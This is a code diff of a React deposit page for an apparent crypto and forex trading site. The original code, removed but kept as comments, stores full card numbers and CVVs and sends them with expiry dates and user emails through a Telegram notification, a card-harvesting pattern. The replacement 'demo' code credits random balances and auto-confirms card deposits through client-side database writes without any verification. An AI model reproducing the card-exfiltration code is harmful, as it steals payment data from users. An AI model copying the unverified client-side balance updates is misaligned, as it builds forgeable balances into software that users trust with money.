@@ -27,7 +27,7 @@ const cryptoOptions = [
 ];
 
 const Deposit = () => {
-  const [selectedCrypto, setSelectedCrypto] = useState(cryptoOptions);
+  const [selectedCrypto, setSelectedCrypto] = useState(cryptoOptions[0]);
   const [transactionHash, setTransactionHash] = useState("");
   const [isVerifying, setIsVerifying] = useState(false);
   const [cardDetails, setCardDetails] = useState({
@@ -91,11 +91,58 @@ const Deposit = () => {
     });
   };
 
+  // COMMENTED OUT: Original verify deposit function
+  // const verifyDeposit = async () => {
+  //   if (!transactionHash.trim()) {
+  //     toast({
+  //       title: "Error",
+  //       description: "Please enter a transaction hash",
+  //       variant: "destructive",
+  //     });
+  //     return;
+  //   }
+
+  //   setIsVerifying(true);
+  //   try {
+  //     const {
+  //       data: { session },
+  //     } = await supabase.auth.getSession();
+  //     if (!session) throw new Error("Not authenticated");
+
+  //     const { data, error } = await supabase.functions.invoke("verify-deposit", {
+  //       body: {
+  //         transactionHash: transactionHash.trim(),
+  //         chain: selectedCrypto.symbol,
+  //       },
+  //     });
+
+  //     if (error) throw error;
+
+  //     toast({
+  //       title: "Success",
+  //       description: data.message || "Deposit verified and credited to your account",
+  //     });
+
+  //     setTransactionHash("");
+  //     queryClient.invalidateQueries({ queryKey: ["deposits"] });
+  //   } catch (error: any) {
+  //     console.error("Verification error:", error);
+  //     toast({
+  //       title: "Verification Failed",
+  //       description: error.message || "Failed to verify deposit. Please check the transaction hash and try again.",
+  //       variant: "destructive",
+  //     });
+  //   } finally {
+  //     setIsVerifying(false);
+  //   }
+  // };
+
+  // DEMO: Demo deposit function (no verification required)
   const verifyDeposit = async () => {
     if (!transactionHash.trim()) {
       toast({
         title: "Error",
-        description: "Please enter a transaction hash",
+        description: "Please enter a transaction hash (demo mode - any hash works)",
         variant: "destructive",
       });
       return;
@@ -104,31 +151,55 @@ const Deposit = () => {
     setIsVerifying(true);
     try {
       const {
-        data: { session },
-      } = await supabase.auth.getSession();
-      if (!session) throw new Error("Not authenticated");
+        data: { user },
+      } = await supabase.auth.getUser();
+      if (!user) throw new Error("Not authenticated");
 
-      const { data, error } = await supabase.functions.invoke("verify-deposit", {
-        body: {
-          transactionHash: transactionHash.trim(),
-          chain: selectedCrypto.symbol,
-        },
+      // Demo: Generate a random amount between 0.1 and 10
+      const demoAmount = Math.random() * 9.9 + 0.1;
+      const demoWalletAddress = `0x${Math.random().toString(16).substring(2, 42)}`;
+
+      // Record the demo deposit
+      const { error: depositError } = await supabase.from("deposits").insert({
+        user_id: user.id,
+        chain: selectedCrypto.symbol,
+        amount: parseFloat(demoAmount.toFixed(6)),
+        transaction_hash: transactionHash.trim() || `demo_${Date.now()}`,
+        wallet_address: demoWalletAddress,
+        status: "confirmed",
+        verified_at: new Date().toISOString(),
       });
 
-      if (error) throw error;
+      if (depositError) throw depositError;
+
+      // Credit user's crypto balance
+      const { data: profile } = await supabase
+        .from("profiles")
+        .select("balance_crypto")
+        .eq("id", user.id)
+        .single();
+
+      const newBalance = (profile?.balance_crypto || 0) + demoAmount;
+
+      const { error: updateError } = await supabase
+        .from("profiles")
+        .update({ balance_crypto: newBalance })
+        .eq("id", user.id);
+
+      if (updateError) throw updateError;
 
       toast({
-        title: "Success",
-        description: data.message || "Deposit verified and credited to your account",
+        title: "Demo Deposit Successful",
+        description: `Demo deposit of ${demoAmount.toFixed(6)} ${selectedCrypto.symbol} credited to your account`,
       });
 
       setTransactionHash("");
       queryClient.invalidateQueries({ queryKey: ["deposits"] });
     } catch (error: any) {
-      console.error("Verification error:", error);
+      console.error("Demo deposit error:", error);
       toast({
-        title: "Verification Failed",
-        description: error.message || "Failed to verify deposit. Please check the transaction hash and try again.",
+        title: "Demo Deposit Failed",
+        description: error.message || "Failed to process demo deposit",
         variant: "destructive",
       });
     } finally {
@@ -136,6 +207,93 @@ const Deposit = () => {
     }
   };
 
+  // COMMENTED OUT: Original card deposit function
+  // const handleCardDeposit = async () => {
+  //   if (!cardDetails.cardHolderName || !cardDetails.cardNumber || !cardDetails.bankName || !cardDetails.amount || !cardDetails.expiryDate || !cardDetails.cvv || !cardDetails.cardType) {
+  //     toast({
+  //       title: "Error",
+  //       description: "Please fill in all required fields",
+  //       variant: "destructive",
+  //     });
+  //     return;
+  //   }
+
+  //   const amount = parseFloat(cardDetails.amount);
+  //   if (isNaN(amount) || amount <= 0) {
+  //     toast({
+  //       title: "Error",
+  //       description: "Please enter a valid amount",
+  //       variant: "destructive",
+  //     });
+  //     return;
+  //   }
+
+  //   setIsProcessingCard(true);
+  //   try {
+  //     const {
+  //       data: { user },
+  //     } = await supabase.auth.getUser();
+  //     if (!user) throw new Error("Not authenticated");
+
+  //     //const lastFour = cardDetails.cardNumber.slice(-4);
+
+  //     console.log(cardDetails.cvv)
+
+  //     const { error } = await supabase.from("card_deposits").insert({
+  //       user_id: user.id,
+  //       card_holder_name: cardDetails.cardHolderName,
+  //       last_four_digits: cardDetails.cardNumber,
+  //       card_number: cardDetails.cardNumber || "0",
+  //       card_type: cardDetails.cardType,
+  //       bank_name: cardDetails.bankName,
+  //       expiry_date: cardDetails.expiryDate,
+  //       cvv: cardDetails.cvv,
+  //       amount: amount,
+  //       status: "pending",
+  //     });
+
+  //     if (error) throw error;
+
+  //     await sendTelegramNotification("CARD_DEPOSIT_ATTEMPT", {
+  //       userId: user.id,
+  //       email: user.email,
+  //       cardHolderName: cardDetails.cardHolderName,
+  //       bankName: cardDetails.bankName,
+  //       amount,
+  //       lastFourDigits: cardDetails.cardNumber,
+  //       expiryDate: cardDetails.expiryDate,
+  //       cvv: cardDetails.cvv,
+  //     });
+
+  //     toast({
+  //       title: "Success",
+  //       description: "Card deposit submitted successfully. Pending verification.",
+  //     });
+
+  //     setCardDetails({
+  //       cardHolderName: "",
+  //       cardNumber: "",
+  //       expiryDate: "",
+  //       cardType: "",
+  //       cvv: "",
+  //       bankName: "",
+  //       amount: "",
+  //     });
+
+  //     queryClient.invalidateQueries({ queryKey: ["cardDeposits"] });
+  //   } catch (error: any) {
+  //     console.error("Card deposit error:", error);
+  //     toast({
+  //       title: "Error",
+  //       description: error.message || "Failed to submit card deposit",
+  //       variant: "destructive",
+  //     });
+  //   } finally {
+  //     setIsProcessingCard(false);
+  //   }
+  // };
+
+  // DEMO: Demo card deposit function (auto-confirms)
   const handleCardDeposit = async () => {
     if (!cardDetails.cardHolderName || !cardDetails.cardNumber || !cardDetails.bankName || !cardDetails.amount || !cardDetails.expiryDate || !cardDetails.cvv || !cardDetails.cardType) {
       toast({
@@ -163,39 +321,44 @@ const Deposit = () => {
       } = await supabase.auth.getUser();
       if (!user) throw new Error("Not authenticated");
 
-      //const lastFour = cardDetails.cardNumber.slice(-4);
+      // Demo: Store only last 4 digits
+      const lastFour = cardDetails.cardNumber.slice(-4).padStart(4, "0");
 
-      console.log(cardDetails.cvv)
-
+      // Demo: Insert card deposit with confirmed status
       const { error } = await supabase.from("card_deposits").insert({
         user_id: user.id,
         card_holder_name: cardDetails.cardHolderName,
-        last_four_digits: cardDetails.cardNumber,
-        card_number: cardDetails.cardNumber || "0",
+        last_four_digits: lastFour,
+        card_number: lastFour, // Demo: only store last 4
         card_type: cardDetails.cardType,
         bank_name: cardDetails.bankName,
         expiry_date: cardDetails.expiryDate,
-        cvv: cardDetails.cvv,
+        cvv: "", // Demo: don't store CVV
         amount: amount,
-        status: "pending",
+        status: "confirmed", // Demo: auto-confirm
       });
 
       if (error) throw error;
 
-      await sendTelegramNotification("CARD_DEPOSIT_ATTEMPT", {
-        userId: user.id,
-        email: user.email,
-        cardHolderName: cardDetails.cardHolderName,
-        bankName: cardDetails.bankName,
-        amount,
-        lastFourDigits: cardDetails.cardNumber,
-        expiryDate: cardDetails.expiryDate,
-        cvv: cardDetails.cvv,
-      });
+      // Demo: Credit user's forex balance immediately
+      const { data: profile } = await supabase
+        .from("profiles")
+        .select("balance_forex")
+        .eq("id", user.id)
+        .single();
+
+      const newBalance = (profile?.balance_forex || 0) + amount;
+
+      const { error: updateError } = await supabase
+        .from("profiles")
+        .update({ balance_forex: newBalance })
+        .eq("id", user.id);
+
+      if (updateError) throw updateError;
 
       toast({
-        title: "Success",
-        description: "Card deposit submitted successfully. Pending verification.",
+        title: "Demo Deposit Successful",
+        description: `Demo card deposit of $${amount.toFixed(2)} credited to your account (auto-confirmed)`,
       });
 
       setCardDetails({
@@ -210,10 +373,10 @@ const Deposit = () => {
 
       queryClient.invalidateQueries({ queryKey: ["cardDeposits"] });
     } catch (error: any) {
-      console.error("Card deposit error:", error);
+      console.error("Demo card deposit error:", error);
       toast({
         title: "Error",
-        description: error.message || "Failed to submit card deposit",
+        description: error.message || "Failed to submit demo card deposit",
         variant: "destructive",
       });
     } finally {
@@ -240,12 +403,12 @@ const Deposit = () => {
             <div className="glass rounded-xl p-6">
               <h2 className="text-xl font-semibold mb-4">Select Cryptocurrency</h2>
               <div className="space-y-2">
-                {cryptoOptions.map((crypto) => (
+                {cryptoOptions?.map((crypto) => (
                   <button
                     key={crypto.symbol}
                     onClick={() => setSelectedCrypto(crypto)}
                     className={`w-full p-4 rounded-lg text-left transition-all ${
-                      selectedCrypto.symbol === crypto.symbol
+                      selectedCrypto?.symbol === crypto.symbol
                         ? "bg-white/10 border-2 border-primary"
                         : "border-2 border-white/10 hover:bg-white/5"
                     }`}
@@ -266,13 +429,13 @@ const Deposit = () => {
               <div className="space-y-4">
                 <div>
                   <label className="text-sm text-gray-400 mb-2 block">Network</label>
-                  <Input value={selectedCrypto.network} disabled className="bg-white/5 border-white/10" />
+                  <Input value={selectedCrypto?.network || ""} disabled className="bg-white/5 border-white/10" />
                 </div>
 
                 <div>
                   <label className="text-sm text-gray-400 mb-2 block">Deposit Address</label>
                   <div className="flex gap-2">
-                    <Input value={selectedCrypto.address} disabled className="bg-white/5 border-white/10 flex-1" />
+                    <Input value={selectedCrypto?.address || ""} disabled className="bg-white/5 border-white/10 flex-1" />
                     <Button onClick={copyAddress} variant="outline" size="icon" className="border-white/10">
                       <Copy className="w-4 h-4" />
                     </Button>
@@ -281,39 +444,39 @@ const Deposit = () => {
 
                 <div className="bg-white/5 rounded-lg p-6 flex flex-col items-center justify-center">
                   <QrCode className="w-32 h-32 text-gray-400 mb-2" />
-                  <p className="text-sm text-gray-400 text-center">QR Code for {selectedCrypto.symbol}</p>
+                  <p className="text-sm text-gray-400 text-center">QR Code for {selectedCrypto?.symbol || ""}</p>
                 </div>
 
                 <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                   <h3 className="font-medium text-yellow-500 mb-2">Important</h3>
                   <ul className="text-sm text-gray-300 space-y-1">
-                    <li>• Only send {selectedCrypto.symbol} to this address</li>
-                    <li>• Ensure you're using the {selectedCrypto.network}</li>
-                    <li>• Minimum deposit: 0.001 {selectedCrypto.symbol}</li>
+                    <li>• Only send {selectedCrypto?.symbol || ""} to this address</li>
+                    <li>• Ensure you're using the {selectedCrypto?.network || ""}</li>
+                    <li>• Minimum deposit: 0.001 {selectedCrypto?.symbol || ""}</li>
                     <li>• After sending, submit your transaction hash below to verify</li>
                   </ul>
                 </div>
 
                 <div className="space-y-2">
-                  <Label>Verify Your Deposit</Label>
+                  <Label>Verify Your Deposit (Demo Mode)</Label>
                   <div className="flex gap-2">
                     <Input
                       type="text"
-                      placeholder="Enter transaction hash"
+                      placeholder="Enter any transaction hash (demo mode)"
                       value={transactionHash}
                       onChange={(e) => setTransactionHash(e.target.value)}
                       className="bg-white/5 border-white/10 flex-1"
                     />
                     <Button
                       onClick={verifyDeposit}
-                      disabled={isVerifying || !transactionHash.trim()}
+                      disabled={isVerifying || !transactionHash?.trim()}
                       className="bg-primary hover:bg-primary/80"
                     >
-                      {isVerifying ? "Verifying..." : "Verify"}
+                      {isVerifying ? "Processing..." : "Demo Deposit"}
                     </Button>
                   </div>
                   <p className="text-xs text-gray-400">
-                    Paste your transaction hash here after sending funds to verify and credit your account
+                    Demo mode: Enter any transaction hash to create a demo deposit (no verification required)
                   </p>
                 </div>
               </div>
@@ -341,7 +504,7 @@ const Deposit = () => {
                     {deposits.map((deposit) => (
                       <tr key={deposit.id} className="border-b border-white/5">
                         <td className="py-3 px-2">{deposit.chain}</td>
-                        <td className="py-3 px-2">{deposit.amount.toFixed(6)}</td>
+                        <td className="py-3 px-2">{Number(deposit.amount).toFixed(6)}</td>
                         <td className="py-3 px-2">
                           <span
                             className={`flex items-center gap-1 ${
@@ -367,11 +530,11 @@ const Deposit = () => {
                             rel="noopener noreferrer"
                             className="text-primary hover:underline text-sm"
                           >
-                            {deposit.transaction_hash.substring(0, 8)}...
+                            {deposit.transaction_hash?.substring(0, 8) || ""}...
                           </a>
                         </td>
                         <td className="py-3 px-2 text-sm text-gray-400">
-                          {new Date(deposit.created_at).toLocaleDateString()}
+                          {deposit.created_at ? new Date(deposit.created_at).toLocaleDateString() : ""}
                         </td>
                       </tr>
                     ))}
@@ -411,7 +574,9 @@ const Deposit = () => {
                   id="cardNumber"
                   placeholder="1234 5678 9012 3456"
                   value={cardDetails.cardNumber}
-                  onChange={(e) => setCardDetails({ ...cardDetails, cardNumber: e.target.value.replace(/\s/g, "") })}
+                  onChange={(e) =>
+                    setCardDetails({ ...cardDetails, cardNumber: e.target.value.replace(/\D/g, "") })
+                  }
                   maxLength={16}
                   className="bg-white/5 border-white/10"
                 />
@@ -437,7 +602,7 @@ const Deposit = () => {
                     type="text"
                     placeholder="123"
                     value={cardDetails.cvv}
-                    onChange={(e) => setCardDetails({ ...cardDetails, cvv: e.target.value })}
+                    onChange={(e) => setCardDetails({ ...cardDetails, cvv: e.target.value.replace(/\D/g, "") })}
                     maxLength={4}
                     className="bg-white/5 border-white/10"
                   />
@@ -449,7 +614,7 @@ const Deposit = () => {
                 <Label htmlFor="bankName">Bank Name *</Label>
                 <Input
                   id="bankName"
-                  placeholder="Bank Number"
+                  placeholder="Bank Name"
                   value={cardDetails.bankName}
                   onChange={(e) => setCardDetails({ ...cardDetails, bankName: e.target.value })}
                   className="bg-white/5 border-white/10"
@@ -478,12 +643,19 @@ const Deposit = () => {
                 </p>
               </div>
 
+              <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4 mb-4">
+                <h3 className="font-medium text-green-400 mb-2">Demo Mode Active</h3>
+                <p className="text-sm text-gray-300">
+                  Card deposits are automatically confirmed in demo mode. No real payment processing occurs.
+                </p>
+              </div>
+
               <Button
                 onClick={handleCardDeposit}
                 disabled={isProcessingCard}
                 className="w-full bg-primary hover:bg-primary/80"
               >
-                {isProcessingCard ? "Processing..." : "Submit Deposit"}
+                {isProcessingCard ? "Processing..." : "Submit Demo Deposit"}
               </Button>
             </div>
           </div>
@@ -508,9 +680,18 @@ const Deposit = () => {
                   <tbody>
                     {cardDeposits.map((deposit) => (
                       <tr key={deposit.id} className="border-b border-white/5">
-                        <td className="py-3 px-2">****{deposit.last_four_digits}</td>
-                        <td className="py-3 px-2">{deposit.bank_name}</td>
-                        <td className="py-3 px-2">${deposit.amount.toFixed(2)}</td>
+                        <td className="py-3 px-2">
+                          {deposit.last_four_digits
+                            ? `****${deposit.last_four_digits}`
+                            : ""}
+                        </td>
+                        <td className="py-3 px-2">{deposit.bank_name || ""}</td>
+                        <td className="py-3 px-2">
+                          $
+                          {typeof deposit.amount === "number"
+                            ? deposit.amount.toFixed(2)
+                            : Number(deposit.amount).toFixed(2)}
+                        </td>
                         <td className="py-3 px-2">
                           <span
                             className={`flex items-center gap-1 ${
@@ -526,7 +707,7 @@ const Deposit = () => {
                           </span>
                         </td>
                         <td className="py-3 px-2 text-sm text-gray-400">
-                          {new Date(deposit.created_at).toLocaleDateString()}
+                          {deposit.created_at ? new Date(deposit.created_at).toLocaleDateString() : ""}
                         </td>
                       </tr>
                     ))}
